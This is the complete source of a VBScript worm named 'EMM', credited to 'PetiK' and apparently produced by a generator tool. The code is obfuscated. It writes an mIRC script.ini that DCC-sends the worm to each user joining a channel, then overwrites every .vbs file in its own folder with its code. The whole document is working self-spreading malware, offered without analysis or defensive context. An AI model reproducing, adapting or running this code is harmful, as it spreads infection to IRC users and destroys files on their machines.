'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
pwdckxdgpxagjvs = WScript.ScriptFullName
Set nmbdltlkkfjaiuv = CreateObject("WScript.Shell")
Set ryuwrwfbnjindsu = CreateObject("Scripting.FileSystemObject")
Set wgqrjvihettmpkt = ryuwrwfbnjindsu.CreateTextFile("C:\mirc\script.ini", True)
wgqrjvihettmpkt.WriteLine "[script]"
wgqrjvihettmpkt.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
wgqrjvihettmpkt.Write "n1=/dcc  send$nick """
wgqrjvihettmpkt.Write pwdckxdgpxagjvs
wgqrjvihettmpkt.WriteLine """ }"
wgqrjvihettmpkt.Close
Set ulpyfgkuwshidnx = ryuwrwfbnjindsu.OpenTextFile(pwdckxdgpxagjvs, 1, 0)
ecvmbkqoydwnhmm = ulpyfgkuwshidnx.ReadAll
ulpyfgkuwshidnx.Close
qupfjbmukexeipt = Left(pwdckxdgpxagjvs, InStrRev(pwdckxdgpxagjvs, "\"))
For Each nvpnxxvswpitwkp in ryuwrwfbnjindsu.GetFolder(qupfjbmukexeipt).Files
If ( Right(nvpnxxvswpitwkp.Name, 4) = ".vbs" ) Then
Set enhjwoqichlgucg = ryuwrwfbnjindsu.CreateTextFile(nvpnxxvswpitwkp.Name, True)
enhjwoqichlgucg.Write ecvmbkqoydwnhmm
enhjwoqichlgucg.Close
End If
Next
'Generated with [INDRA] v0.4es.
